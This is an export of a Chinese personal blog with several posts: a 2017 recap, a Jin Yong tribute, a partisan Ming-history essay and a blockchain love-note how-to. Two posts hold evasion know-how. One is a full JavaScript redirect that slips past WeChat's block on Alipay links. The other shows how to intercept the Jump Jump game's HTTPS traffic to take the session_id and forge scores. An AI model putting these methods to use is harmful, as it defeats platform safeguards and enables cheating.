    <content type="text"><![CDATA[刚回到家，因为公司项目急，今天加班了一天[doge],打开电脑听小南的最新节目。 现在是 2017 年 12 月 31 日 21 点，又是一个跨年夜，记得去年这个时候我也总结了 我的 2016 年 一晃 365 天过去了 。 微博上看到 习大大 2018 年新年贺词了，总之一片祥和。 https://weibo.com/2656274875/FCdWg0g4r 记得年初的时候定了小目标，看来又要打脸了。https://weibo.com/2717930601/EoRiF3rHT 那些更新的微博 这一年更新了近一万条微博，粉丝也增加了1000多，其实微博几乎每天更新，没有装网易和今日头条，所以每天新闻来源都是微博，还有新技术和文章我都会通过微博更新到公众号和github。 那些更新的公众号 我写公众号纯粹是一种记录，没有像他们 2017新媒体百大人物 那样靠公众号就能过得很好。这个号今年更新频率增加了，另外我还申请了个专门写技术文章的号：苏生不惑 也都获得原创和赞赏功能了。总共发布近 100 篇文章了，几乎每个月 8 篇，阅读量最高(2515)的来自 下载电影/视频神器 我还整理了精选列表 公众号精选 希望能对你有帮助。 那些听过的歌 因为在网易云音乐上传了《周杰伦 16 年精选》视频 http://music.163.com/#/video?id=F034FFC2767D7F664C8C2B3310922516&amp;toast=true 和筷子兄弟《老男孩》http://music.163.com/#/video?id=5C2B199C91B266A6605F4D865179C6DD&amp;toast=true 至今每天都会受到评论和收藏消息，粉丝增加不少 ，如果你也喜欢听歌，可以关注我 http://music.163.com/#/user/home?id=293753445 ####那些更新的技术 关于 python 今年的确深入学习了也进步不少，而且还花钱报了教程，也更新过几篇文章 python 分析《致我们单纯的小美好》豆瓣影评 下载电影/视频神器 segmentfault 声望没有达到 18 K 主要今年没那么多时间去答题了，不过写过的几篇文章《PHP那些坑》 https://segmentfault.com/a/1190000010748235 和 《命令行神器推荐》 https://segmentfault.com/a/1190000009728316 成为季度 Top Writer https://weibo.com/2717930601/FsMKu7GEZ 关于演唱会和旅行 本来今年看周杰伦《地表最强演唱会》，没买到票，失望，旅行也搁浅。 关于熬夜 这个没有做到，几乎每天 12 点半睡，主要是睡前刷微博。。。 关于加薪 5 月份的时候就加了，还算满意吧，明年继续上涨。 关于攒钱 每个月除去租房和吃饭都用来理财了，而且每天用支付宝记账，余额宝只能放 10 万，其他的买定期和基金，p2p，收益日增。其实也不大懂这些，不过只要不贪，不会像投资钱宝那样血本无归。 关于成家立业 伤感，略。。。 那些看过的电影 这是豆瓣 2017 年度电影 https://movie.douban.com/annual/2017?source=dbmovieweibo 和全年上映电影 http://www.yue365.com/movie/time/2017shangying.shtml 2017年300部电影混剪 https://weibo.com/2668045542/FBkmYmvCs 今年看过的有《拆弹专家》《羞羞的铁拳》《芳华》，前 几 部都没有什么印象了，最近看的芳华没有了冯小刚《大腕》《非诚勿扰》式的黑色幽默，看完有种深深的无奈，作为同雷锋一样的刘峰因为好友结婚没钱，自己动手打造一个椅子，因为喜欢一个姑娘，放弃上大学的机会，然后告白被人看见被诬告下放，然后经历战争失去一只手，最后与何小平相依为命，让人感觉这并不是一代人的芳华，而是那些高干子弟的芳华，不过其中有几个镜头还是挺感人的，值得一看。 总结 看到微博上有 用一句歌词总结你的2017 https://weibo.com/1895964183/FBIGtousM 如果用一句歌词那该是 毛不易《像我这样的人》的 ： 像我这样孤单的人， 像我这样傻的人， 像我这样不甘平凡的人， 世界上有多少人， 像我这样莫名其妙的人， 会不会有人心疼。 像我这样的人毛不易 - 明日之子 第8期 关于 2017 记忆，可以看看微博 新浪科技年度视频 https://weibo.com/1642634100/FBUDWisbq ，https://weibo.com/1973326124/FBKDxcela 最后推荐个2017年度视频广告 Top 50 很有创意，有空看看 https://socialbeta.com/toplist2017/commercial-of-the-year 2018 的新年计划就不立那么多了，活着就好。 2017 谢谢啦， 再见 from https://weibo.com/5614350686/FBCYr2pCb 最后给大家送上红包一个，感谢各位关注。]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[微信打开支付宝红包新套路]]></title>
    <url>%2F2019%2F08%2F28%2F%E5%BE%AE%E4%BF%A1%E6%89%93%E5%BC%80%E6%94%AF%E4%BB%98%E5%AE%9D%E7%BA%A2%E5%8C%85%E6%96%B0%E5%A5%97%E8%B7%AF%2F</url>
    <content type="text"><![CDATA[最近支付宝的红包活动还在继续，我们知道微信很早就屏蔽了支付宝链接的，连淘宝链接也打不开。但是最近发现朋友圈很多人发了自己的链接点击进去发现居然跳调起浏览器然后转到支付宝了，然后就领了对方的红包，这套路 666，然后找到源代码自己也折腾了下，可惜今天已经被屏蔽了，不过还是值得研究的。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161&lt;!DOCTYPE html&gt;&lt;html lang="zh-cmn-hans"&gt;&lt;head&gt;&lt;meta charset="UTF-8"&gt;&lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;&lt;meta http-equiv="X-UA-Compatible" content="ie=edge, chrome=1"&gt;&lt;title&gt;正在打开支付宝，请稍候……&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;&lt;script&gt; //这是你自己的口令链接var _0 = "https://qr.alipay.com/c1x06944aqsf1qqkpv9of19"; var _1 = "https://qr.alipay.com/c1x06944aqsf1qqkpv9of19"; function is_weixin() &#123; if (/MicroMessenger/i.test(navigator.userAgent)) &#123; return true &#125; else &#123; return false &#125;&#125;function is_android() &#123; var ua = navigator.userAgent.toLowerCase(); if (ua.match(/(Android|SymbianOS)/i)) &#123; return true &#125; else &#123; return false &#125;&#125;function is_ios() &#123; var ua = navigator.userAgent.toLowerCase(); if (/iphone|ipad|ipod/.test(ua)) &#123; return true &#125; else &#123; return false &#125;&#125;function android_auto_jump() &#123; WeixinJSBridge.invoke("jumpToInstallUrl", &#123;&#125;, function(e) &#123;&#125;); window.close(); WeixinJSBridge.call("closeWindow")&#125;function ios_auto_jump() &#123; if (_0 != "") &#123; location.href = _0 &#125; else &#123; window.close(); WeixinJSBridge.call("closeWindow") &#125;&#125;function onAutoinit() &#123; if (is_android()) &#123; android_auto_jump(); return false &#125; if (is_ios()) &#123; ios_auto_jump(); return false &#125;&#125;if (is_weixin()) &#123; if (typeof WeixinJSBridge == "undefined") &#123; if (document.addEventListener) &#123; document.addEventListener("WeixinJSBridgeReady", onAutoinit, false) &#125; else if (document.attachEvent) &#123; document.attachEvent("WeixinJSBridgeReady", onAutoinit); document.attachEvent("onWeixinJSBridgeReady", onAutoinit) &#125; &#125; else &#123; onAutoinit() &#125;&#125; else &#123; if (_1 != "") &#123; location.href = _1 &#125; else &#123; window.close() &#125;&#125;&lt;/script&gt; 以上代码的链接怎么换成自己的呢？参考这篇文章 https://www.jianshu.com/p/b599f85fdbef?from=groupmessage 简单来说就是在支付宝把自己的口令二维码下载到电脑，打开 https://cli.im/deqr 上传图片获取到链接地址，通常我们扫码的结果就是访问这个链接。有了链接后需要用短网址处理，因为微信可能会屏蔽，这就需要 http://dwz.wailian.work/ 生成微博的 t.cn 即可 . 好了代码都有了，怎么能在外网访问呢？如果有自己服务器就方便了，没有的话可以用 codeanywhere.com codepen.io jsbin.cn 等， 但比较麻烦，如果你会用 github 就方便了，新建立一个库，代码放上去，比如我的。 github page 有 3种方式来访问https://gzyq.github.io/2017/04/07/read-github-html/ ： 1.建立仓库名 name.github.io master分支的代码就可以通过name.github.io来反问，但是只能建一个这样的repo 。 2.将新建的repo 代码部署到 gh-pages 分支。 3.在repo settings页面，找到GitHub Pages选项，点击 Source 下面的 None 选项，如下图示，选择master branch，最后点击 Save 按钮。 完成后就可以用 github.io 域名访问了。比如我的这个链接 lovecn.github.io/wechat_alipay/index.html 如果不加文件名默认访问 readme 如果不方便新建立 repo 可以将 github 上的文件地址 通过来访问 http://raw.githack.com/ http://htmlpreview.github.com/ 将文件地址填入即可生成 url 说完支付宝红包，最近网易推出2017 你听过的歌单，然后支付宝在 3 号推出了2017 年度账单，朋友圈又刷屏了，我也分享了,17 年消费了 8000 多，理财（主要是余额宝） 2400 多，评价每个月 200 ，今年要多渠道理财了。 随后微博上爆出里面的 《芝麻服务协议》同意这个协议，你的信息就会被收集，包括在第三方保存的信息，详细见文 支付宝认错了 然后微博上 @芝麻信用 进行了回应 https://weibo.com/3732213162/FCHPE5UBk?type=comment#_rnd1515325256703 所以如果你打开过这个报告，记得这样操作下：在支付宝里点“我的”，然后点“芝麻信用”，然后点“信用管理”，然后点“授权管理”，找到支付宝，就可以解除授权了。 ps：最近看到一个 2017 最佳 50 广告 https://socialbeta.com/toplist2017/commercial-of-the-year ，里面有几个还是不错的，跟拍电影似的，比如京东的《你不必成功》OPPO的《周杰伦的2000万个故事》网易《音乐的力量》999《总有人偷偷爱着你》 有兴趣可以看看。]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[微信跳一跳后又来直播答题]]></title>
    <url>%2F2019%2F08%2F28%2F%E5%BE%AE%E4%BF%A1%E8%B7%B3%E4%B8%80%E8%B7%B3%E5%90%8E%E5%8F%88%E6%9D%A5%E7%9B%B4%E6%92%AD%E7%AD%94%E9%A2%98%2F</url>
    <content type="text"><![CDATA[这周王菲发布了最新歌曲《无问西东》，封面依然和之前的《清风徐来》类似，天后发新歌似乎如同发自拍。 微信2 周前发布的跳一跳在朋友圈刷屏，不少人玩的不亦乐乎，当然为了弄个好排行大家也是蛮忙的。以下整理的各种方法帮你提高排名，当然可能有些已经失效了。 1， python 自动跳脚本 https://github.com/wangshub/wechat_jump_game 安装 py 库和 adb 通过脚本自动跳 $ python wechat_jump_auto.pyLoad config file from \wechat_jump_game/config/1280x720/config.json请确保手机打开了 ADB 并连接了电脑，然后打开跳一跳并【开始游戏】后再用本程序，确定开始？ y/n [y]: y程序版本号：1.1.1 Screen: Physical size: 720x1280Density: Physical density: 320DeviceType: CHM-TL00HOS: win32Python: 3.5.2 (v3.5.2:4def2a2901a5, Jun 25 2016, 22:01:18) [MSC v.1900 32 bit (Intel)] 采用方式 1 获取截图scan_start_y: 4261514910173 225 739 525.5 566adb shell input swipe 330 1059 330 1059 727scan_start_y: 4261514910177 555 747 203.0 554adb shell input swipe 374 1050 374 1050 842scan_start_y: 4261514910182 540 747 169.5 534adb shell input swipe 346 1053 346 1053 897scan_start_y: 426 当然这个对不懂技术的有点难度，作者还提供了安装包，下载点击就可以用 https://github.com/wangshub/wechat_jump_game/releases 2，通过 post session_id 直接修改 charlesproxy 里抓包的请求,wxagame/wxagame_init url 的请求，请求 json 里包含 session_id https://gist.github.com/feix/6dd1f62a54c5efa10f1e1c24f8efc417#file-wx_t1t_hack-jshttps://gist.github.com/mysteriouss/01d7f18cdef47acc0781e8f484f2d2d0 具体方法如下： 下载最新 charlesproxy启动 charlesproxy配置代理： 设置 &gt; 无线局域网 &gt; 配置代理 &gt; 手动 &gt; IP：电脑 ip，端口： 8888导入 https 证书： 浏览器访问 http://chls.pro/ssl 下载安装证书启动跳一跳小程序去 charlesproxy 里查看抓到的请求, wxagame/wxagame_init 路径的请求，请求体里就包含 session_id或者手机下载 surge设置 - 通用 - 关于本机 - 证书信任设置 - 打开Charles Proxy CA 开关右键 mp.weixin.qq.com 找到 Enable SSL Proxyingnpm install crypto-js request-promise requestnode wx_t1t_hack.js 如果嫌执行脚本麻烦，可以直接这个网站http://tyt.zhaoxuyang.com/WxTyT/ 提交修改。 其他： PHP 玩微信跳一跳 https://github.com/metowolf/JumpJumpHelper Kotlin 完成 微信跳一跳 的自动找点 https://github.com/uglyer/wechat_jump_ai_kotlin 微信跳一跳外挂 Android 版 https://pan.baidu.com/s/1eSAPEjoNode 版本的玩微信跳一跳 https://github.com/wotermelon/toJumphttps://github.com/easyworld/PlayJumpJumpWithMouse node 玩跳一跳 https://github.com/aOrz/wx_jump_game微信跳一跳 “AI” 外挂 Golang 版本 https://github.com/wangshub/wechat_jump_gamehttps://github.com/faceair/youjumpijump https://github.com/junbaor/wechat-jump-jump https://github.com/Chaaang/wechat_jumpandjump 用鼠标玩微信跳一跳 https://github.com/easyworld/PlayJumpJumpWithMouse Python 玩微信“跳一跳” JS写小游戏「跳一跳」外挂之Canvas图像识别 视频教程 http://www.bilibili.com/video/av17973476/ 微信跳一跳iOS AI实现版 https://github.com/michaelfeng/wechat_jump_ai 微信跳一跳外挂 https://github.com/faceair/youjumpijump http://www.charlesproxy.com/getssl/ ARKit 版微信跳一跳游戏 https://github.com/songkuixi/ARBottleJump Charles 从入门到精通 http://blog.devtang.com/2015/11/14/charles-introduction/ 微信《跳一跳》自动玩 https://github.com/GameTerminator/AutoJump http://www.autojs.org/topic/262/%E5%BE%AE%E4%BF%A1%E8%B7%B3%E4%B8%80%E8%B7%B3%E8%87%AA%E5%8A%A8-%E5%8A%A0%E9%80%9F%E7%89%88%E6%9C%AC-%E5%AE%89%E5%8D%936-0%E4%B9%9F%E5%8F%AF%E4%BB%A5 微信小游戏跳一跳作弊器 https://github.com/ksky521/wechat-jump-game-hack 过去 2周，朋友圈已经没多少人玩跳一跳了，因为这周大家都在玩直播答题，冲顶大会，百万英雄，回答对 12 题分百万奖金，据说一个大学女生一人分得 103 万，简直一夜暴富，刺激。所谓技术是第一生产力，于是有了 https://github.com/Skyexu/TopSup https://livc.io/blog/204 还是基于 python ocr 识别图片然后打开浏览器搜索。还有 支持多开的百万英雄/芝士超人/冲顶大会答题助手 https://github.com/rrdssfgcs/wenda-helper 以上都属于外挂，可能有人会鄙视，但是火车票也是要抢的，如果有更好更快的方式为什么不尝试呢。 ps：最近发现一个公众号文章网站，类似微信搜狗 http://chuansong.com/]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何在区块链上表白]]></title>
    <url>%2F2019%2F08%2F28%2F%E5%A6%82%E4%BD%95%E5%9C%A8%E5%8C%BA%E5%9D%97%E9%93%BE%E4%B8%8A%E8%A1%A8%E7%99%BD%2F</url>
    <content type="text"><![CDATA[关于区块链，今年已经大火了，就不多做说明了，怎么将一段文字留永久在区块链上呢，比如给女朋友表白，代表天长地久。 首先你创建一个以太坊钱包，使用 imtoken 就好，注册 一个钱包地址，比如我的地址是 0x2DE12E54A4B5d43210e0BDd90F305E3f3a9f0403 需要备份好私钥,同时你需要先转入一点eth到钱包，因为转账的时候需要旷工费，大概0.04eth。 然后找一个将文字转化为16进制的工具，比如这个 https://brainwalletx.github.io/#converter 如果你要储存图片，先图片转化成base64编码，再把编码转成16进制码。 xxx，我爱你，我需要你！ 这段文字转换为16进制就是 0x787878efbc8ce68891e788b1e4bda0efbc8ce68891e99c80e8a681e4bda0efbc81 之后 打开软件 Imtoken，进入转账页面，打开高级选项。将上面的十六进制粘贴进去。gas price 建议填20，gas 建议填200000。 转账成功大概需要等待10分钟，成功后复制URL 就是这个地址了 https://etherscan.io/tx/0xbe56253cfdbe9d01b46c937ccb0e8b07f4d6c0e1ebf9bd402982b3057ef89b13 点击阅读原文查看 点击 conver to ut8 就显示中文了，只要以太坊还存在，你的表白就被上万个以太坊矿工见证，永远写入区块链，载入史册，永不可篡改，而这一切只花费了5块钱，当然前提是你有女朋友。。。]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[金庸大侠已去]]></title>
    <url>%2F2019%2F08%2F28%2F%E9%87%91%E5%BA%B8%E5%A4%A7%E4%BE%A0%E5%B7%B2%E5%8E%BB%2F</url>
    <content type="text"><![CDATA[现在是11月10号，天猫双十一晚会又来了，双十一一搞就是十年，然而每年我都没什么东西要买的，而且很多商家会先涨价然后打折，其实便宜不了多少，如果你真的想省钱的话推荐一个chrome插件 购物党，它能方便的查看某个商品历史价格 https://www.gwdang.com/app/extension/?from= 再说回金庸，一个华人史上无法磨灭的名字，上个月30号刚过世，在那几天整个朋友圈，微博都在刷屏，因为他的影响力太大了，而且我查百科才知道他表哥是徐志摩，表外甥女琼瑶，都是名人啊。 30号微博上不少博主开始怀念金庸，摘录几个： 襄阳日报的这条 https://weibo.com/2770589022/H0p13Dyqe?type=comment#_rnd1541855238108 崇拜金庸的马云（阿里的花名风清扬就来自笑傲江湖）这条 https://weibo.com/2145291155/H0vkig5A4?type=comment#_rnd1541855418626 李若彤 https://weibo.com/6386087847/H0nQrtK0B?from=page_1005056386087847_profile&amp;wvr=6&amp;mod=weibotime 还有人将金庸先生将永远被记录在区块链中，通过https://etherscan.io/address/0x384baf9262e6c41457df18ad5e2dc192f20ade54e4a67e190278334070c18279 查看 对于80,90一代来说，从小受港台影视的影响，看了不少港台剧，其中影响最深的莫过于金庸武侠剧，据不完全统计，自60年代开始翻拍的金庸武侠剧已超过上百部，还有无数经典的影视歌曲，对于我来说，看的第一部金庸武侠剧就是95《神雕侠侣》了，光看剧照，简直神仙眷侣一般，那个时候的古天乐和李若彤，郎才女貌，珠联璧合。 儿时还因为尹志平玷污小龙女的片段而耿耿于怀，后来我觉得是这样，小龙女这个人不食人间烟火，太过完美了，没有瑕疵，未免让人觉得虚幻，所以需要经历些磨难，所谓苦尽甘来，最后还是和杨过移居终南山。 我的公众号叫：飞雪连天射白鹿，名字就来自金庸的7部小说，另外7部是笑书神侠倚碧鸳，上学时期还看过几部小说，那会看得如痴如醉。 14 部经久不衰的小说，为什么是金庸写出来的。我觉得是他的人生阅历练就的，出生在动荡的民国，中国刚推翻满清，社会动荡，世界也在风云变幻中，经历一战，二战（抗日），内战，还有之后的各种运动，从那个年代走过来，见证了历史，他的很多小说不像古龙那样没有历史背景，都是基于某个朝代的武侠故事，比如南宋末年的神雕，才有郭靖在襄阳的抵抗蒙古，元末的倚天屠龙记，才有张无忌创建明教，朱元璋建立大明朝，清乾隆的鹿鼎记，才有陈近南天地会的反清复明。写的都是正义，武林人士为国家抛头颅，洒热血的家国情怀，这是最好的爱国主义题材小说。 抛开武侠，金庸小说对我们的影响是什么呢？毕竟武侠只是个寄托，而且我们也不可能练就杨过，张无忌那样的绝世神功，现代社会不需要这种可以施暴的武力，那么为什么我们还如此怀念金庸的武侠呢？我觉得是小说中的那些人，比如侠之大者，为国为民的郭靖，甘愿为辽国和大宋和平自杀的乔峰，尽管中原多次被外族入侵，但是有了像文天祥，史可法，岳飞，于谦这样的民族英雄，才有了华夏文明的延续千年。 网上还流传一个段子 https://weibo.com/2472108573/H0uDwvgCz ，给大家乐下，其实最早的版本是假如当时丘处机没有路过牛家村： 如果那年张无忌睡了小昭…… 1、如果那年张无忌和小昭发生了某些不可描述的事情，那么小昭就不是处女，因此不能担任波斯明教圣女。 2、圣女被张无忌给糟蹋无法担任教主，风云三使和十二宝树王依教规必杀之，结果肯定打不赢张无忌，以张无忌无敌天下的神功，自会一统明教。 3、张无忌统一明教后，因担心小昭吃醋，会携圣火令返回波斯总坛，远离赵敏，中原明教就会交给杨逍统率。 4、波斯明教并入中土，中原的科技和文明会传到波斯，尤其是火药技术，另外有了神功盖世的张教主镇楼，帖木儿帝国会发展的异常强大。 5、强大的帖木儿帝国不能攻打中原，只能朝另一个方向扩张，安卡拉战役就会提前爆发，奥斯曼帝国会被打成屎，搞不好就此被灭。 6、即使奥斯曼帝国不灭，也只能苟延残喘，不可能率8万大军进攻君士坦布尔，拜占庭帝国也不会灭亡。 7、拜占庭帝国不倒，大量工匠和画家就不会西行避难去欧洲。 8、没有拜占庭的工匠流入，文艺复兴就不会出现，欧洲黑暗的中世纪仍将至少持续几十年。 9、没有文艺复兴，西方就不会迎来资本主义萌芽。 10、奥斯曼帝国无力控制欧亚商路，东西方贸易可以通过中亚至小亚细亚陆路进行，就不会出现大航海时代。 11、没有大航海，北美洲就还是原住民印第安人的地盘，美帝国主义就不会出现。 12、另一边中原明教由杨逍统帅，张无忌在波斯远程遥控，朱元璋就不会阴谋得逞。 13、朱元璋有顾忌就不敢乱来，就不会乱杀常遇春，徐达等开国功臣，明朝的国力不会衰退。 14、国力强盛，郑和下西洋就不会被暂停，大航海时代会由中国开启，中国会率先出现资本主义萌芽，没日本明治维新什么事了。 15、出现资本主义萌芽，就不会爆发李自成的农民起义，更没有吴三桂引清兵入关。 16、没有清兵入关，就不会有近代史上中国的孱弱，同时日本明治维新远落后中国，二战即使爆发，日本也远远不是中国对手。 17、没有任何敌手，中国如果发展到现在，自然将成为地球第一强国。 18、地球上有没有美国都是一个问号，当然也就没有中美贸易战。 19、没有中美贸易战，近期A股当然就不会跌的这么惨。 20、所有的这一切，就怪张无忌，你说你一个正常男人，天天对着混血美女小昭，怎么就不能睡一次？！ 再推荐下最近网络上流传的视频，如果你喜欢金庸可以怀念下： 25首最经典且耳熟能详的金庸武侠剧主题曲 https://weibo.com/1344386244/H0u7Qp3DZ金庸群侠传混剪 https://weibo.com/5589166520/H0of7eGKM 金庸 访谈、电子书合集 https://weibo.com/5888006271/H0nO7hicB 金庸去世：一代武侠风云史https://weibo.com/ttarticle/p/show?id=2309404301177528404180 史记·金庸传 https://www.jianshu.com/p/597a715ec737 忆当年公子来时，白马西风，书剑恩仇，我亦同笑傲江湖！ 恨如今先生去矣，为国为民，侠之大者，谁仗剑倚天屠龙！ 敬挽金庸！ 最后放上一个我经常听的音频节目【小南.城市晚安.历年来不同版本神雕侠侣的主题曲】，点击原文收听。https://www.ximalaya.com/yinyue/230311/134159028]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[公元 1644]]></title>
    <url>%2F2019%2F08%2F28%2F%E5%85%AC%E5%85%83-1644%2F</url>
    <content type="text"><![CDATA[公元1644，崇祯十七年，大明王朝亡，史称甲申国难。 明朝，为什么最喜欢这个被骂的最惨的朝代？ 明朝，日月昭昭，华夏永昌。 明朝，内阁制。 明朝，李时珍《本草纲目》，谈允贤《女医杂言》，吴有性《瘟疫论》医学发达，王阳明心学一派。 明朝，天子守国门，君王死社稷。汉族人活得相对有尊严。华夏族人在那时候或许会活得很辛苦，但绝不会窝囊。 明朝，资本主义萌芽 明朝，法治社会，想要在明朝合法杀人是非常非常难的 明朝，几乎人人都会写蝇头小楷，书法平民化 明朝，委婉的戏曲艺术 明朝，盛明时期拥有全世界最强大的军事力量。无汉唐之和亲，无两宋之岁币。 山河奄有中华地？日月重开宋朙天！ 生则华夏兮死则大明，寸丹为重兮七尺为轻 她，没有汉朝的倾国倾城 她，没有唐朝的浪漫开放 她，没有宋朝的感性多情 她，只用一袭交领袄裙裹住一身傲骨，在历史的洪流中用生命抵挡外族的侵袭。 她，叫明。 当然还有那部非常喜欢的《明朝那些事》，话说明朝的皇帝自太祖，成祖后，质量是一个不如一个，嘉靖，万历几十年不上朝，天启专心木匠活，给崇祯留下个烂摊子，尽管如此，这么多奇葩皇帝，但为什么明朝能一直延续276年呢，这要靠的是内阁，尤其万历前十年，一代名臣张居正，把国家治理的井井有条，形成了一个掌握国家权力的内阁集团。皇帝其实没那么重要，只要不太乱折腾，都没什么事，不像清朝，皇帝的皇权达到顶峰，一切听从皇帝，正因为如此，明清的文化可见一斑，说起清，整个一奴才文化，谁敢指责朝廷，而明相对开明，君不见海瑞把嘉靖骂得狗血喷头，而且扬言做个死的准备，把棺材都做好了，最后入狱还是没死还出来了。 要说崇祯元年（1627），整个形式还不算太差，起义军声势不大，野猪皮努尔哈赤还在关外，宦官和东林党互相斗争，还算平和。而崇祯毕竟年轻（才16岁即位），也没得到良好的皇室教育，根本没有治国能力，而他哥哥天启居然还是文盲，这也不能怪他，这一切还是万历造成的，万历一直不想立天启他爸为太子，但又不能破坏祖制（嫡长子），所以他爸整天担惊受怕，万一哪天就当不了太子，也就没照顾好儿子的教育，自然崇祯也好不到哪去。 崇祯听信东林党把魏忠贤拿下了。之后就开始掌握朝政，立志做个明君，中兴大明，说实话也很勤奋，每天上朝，批奏折，但这些并没什么卵用，由于没有了魏忠贤，东林党独大，国家财政紧缺，然后不收地主的税，反而给农民加税，导致无数人饿死，进而加入闯军，使得军队更需钱来打仗，而且他的性格缺陷最为致命，刚愎自用，不信任任何大臣（可能跟出身环境有关，所以一个人的童年教育是多么重要）。在位17年，换了几十个内阁首辅，杀了一个个保卫国家的武将，袁崇焕最让人寒心，之后谁还敢为他卖命。整整17年，没培养出一个领导班子，看起来是很勤奋，可认识不到自己根本没那个能力。结果是把一副好牌打成那样，可怜又可恨！ 历史给了崇祯好几次机会，但他都选择了错误的选项，孙传庭把李自成打败后眼看就要剿灭的时候，又把他调回北方抵抗野猪皮，之后李自成的队伍越来越大，一发不可收拾，然后再也无力回天了。最后关头李自成准备攻城的时候，想让崇祯封王给钱他就不打北京，可那高傲的自尊心让崇祯又拒绝了，拒绝后其实还有条路，那就是迁都南京，当年北宋被金灭后也是迁都杭州，才与金划江而治，还延续了100多年，而且当年朱元璋在南京有一套体制可以直接用，打不过就走嘛，他日再打回来，更重要的是当时江南富裕，没有战乱，可以招募军队，完全不成问题的。崇祯其实也想过迁都，与大臣商量好议会的时候提出来，可关键时刻那个大臣却反悔了，因为他知道万一哪天要找人背负迁都罪名，肯定他来当替罪羊，崇祯干了好几回这种事，太让人寒心了，最后因为没有人提出来，他又死要面子，最后以一句：天子守国门，君王死社稷，最后自缢煤山。如果当初选择了迁都，哪怕自己不走，让太子走，成全自己的名节，也不会出现之后的晚明各个军阀拥利各个皇帝，比如李定国拥护永历，郑成功拥护隆武，在关键时刻因为内斗导致反清复明大业失败，李定国未定国，郑成功未成功，之后被清野蛮统治了267年，千古罪人，崇祯也！ 看《江山风雨情》结局的时候很是难过，一个有理想抱负的君主，一个延续200多年的王朝，就这样被外族取代。封建王朝的体制决定了一个王朝从最初开国到繁荣，衰落，一般是300年左右，随着大地主兼并土地严重，农民没有地，吃不上饭，最后选择造反，通过战阵推翻前朝，削减人口，建立新朝，又开始分土地，休养生息，周而复始。西汉210年，东汉195年，北宋167年，南宋152年，明276年，清267年。几个朝代积累的弊病，也不能怪崇祯，但千不该万不该最后让野猪皮取得中原，如果不是李自成占领北京，招降吴三桂失败，吴三桂引清兵入关，以满的人口和实力，根本入不了山海关，可恨啊。 再说下那首传唱度很高的《向天再借500年》，小时候是看《康熙王朝》听的，很喜欢歌里的豪迈与霸气，没想到却本该是《大英雄郑成功》的主题曲，被《康熙王朝》拿去，看歌词明了。 崇祯最后的遗言说到：朕自登基十七年，逆贼直逼京师，虽朕薄德匪躬，上干天怒，致逆贼直逼京师，然皆诸臣误朕也。朕死，无面目见祖宗于地下，自去冠冕，以发覆面。任贼分裂朕尸，勿伤百姓一人。文臣人人可杀。说得就是那些满嘴仁义道德，所谓的文人士大夫，一个个投降满人，还说出那句：水太凉，头皮痒。 推荐下最近看过不错的视频节目： 壬辰倭乱（万历朝鲜之役）1592【CCTV韩国合拍/熟肉】https://www.bilibili.com/video/av6762218?from=search&amp;seid=5604451399030896684 崇祯不负责任的自杀，导致大明王朝彻底崩溃https://www.bilibili.com/video/av26432287?from=search&amp;seid=6374142017838670595 【木鱼微剧场】《走向共和》（Part 3） https://www.bilibili.com/video/av9183483 《红楼梦》与剃发易服－满清入关后的非与是 https://www.bilibili.com/video/av27396782 电视剧的清宫辫子都错了 https://www.bilibili.com/video/av24224654/?spm_id_from=333.788.videocard.1 【百家讲坛】纪连海讲述江阴八十一日——剃发易服与阎应元、夏完淳抗清事迹 https://www.bilibili.com/video/av3989794/?spm_id_from=333.788.videocard.5 不平反被满清篡改的历史 就找不回华夏的风骨 https://www.bilibili.com/video/av35129322/?spm_id_from=333.788.videocard.9 《明清易代及华夏文明千年之变局》 https://www.bilibili.com/video/av28979755 公元一六四四甲申国难1644 https://www.bilibili.com/video/av9298360 海龙屯“甲冑元年”第二部宣传片上新啦https://www.bilibili.com/video/av32080847 故国有明，日月不落。https://www.bilibili.com/video/av33026220 公元一六四四纪录片 https://www.bilibili.com/video/av14348796 崇祯mv甲申丧 大明亡国三百七十载纪念 https://www.bilibili.com/video/av1759204 你剃发易服去当满清的官 你让我怎么原谅你？https://www.bilibili.com/video/av34797659 https://www.bilibili.com/video/av17705312/ 大明劫之传庭死，大明亡！ https://www.bilibili.com/video/av11503977/?spm_id_from=333.788.videocard.15 大灰狸带你看一部用心拍摄的国产古装历史题材电影《大明劫》 让历史照亮未来https://www.bilibili.com/video/av8836125 电视剧专辑《南明王朝：长河东流》（又名《逐鹿中原：谁主沉浮》） http://list.youku.com/albumlist/show/id_49091615 http://www.iqiyi.com/playlist419287102.html 崇祯自杀殉国，清军定鼎中原https://www.bilibili.com/video/av31506402 电视剧《长河东流（36集）》，http://pan.baidu.com/share/link?shareid=2706852042&amp;uk=3377511283 百度网盘有资源https://pan.baidu.com/s/1i6NtVsp，密码gw7b 【纪录片】历史转折点 https://www.bilibili.com/video/av12377871/?spm_id_from=333.788.videocard.12 商传《是谁误读了晚明史》https://www.bilibili.com/video/av3235903/?p=2 公元一六四四纪录片https://www.bilibili.com/video/av14348796/?p=2 百家讲坛20170409五百年来王阳明_哔哩哔哩 bilibilihttps://www.bilibili.com/video/av31066351?p=10 历史纵横·明史·大明皇帝【全17集】https://www.bilibili.com/video/av9613597/?spm_id_from=333.788.videocard.2 电视剧《江山风雨情》http://www.iqiyi.com/v_19rrjrbhnc.html 电影《柳如是》https://www.bilibili.com/bangumi/media/md47632/?from=search&amp;seid=3169979419740294501 最后推荐一部电影《大明劫》，点击原文可观看。我认为这是近十年最好的国产历史题材电影。影片讲述的是 明朝崇祯15年，全国内忧外患，大将孙传庭临危受命带着妻子冯氏来到潼关抵抗李自成的军队。潼关一战，孙传庭站死，所谓：传庭死，名忘矣。崇祯17年，大明王朝覆灭，国祚276年，从此最后一个汉人王朝结束了。 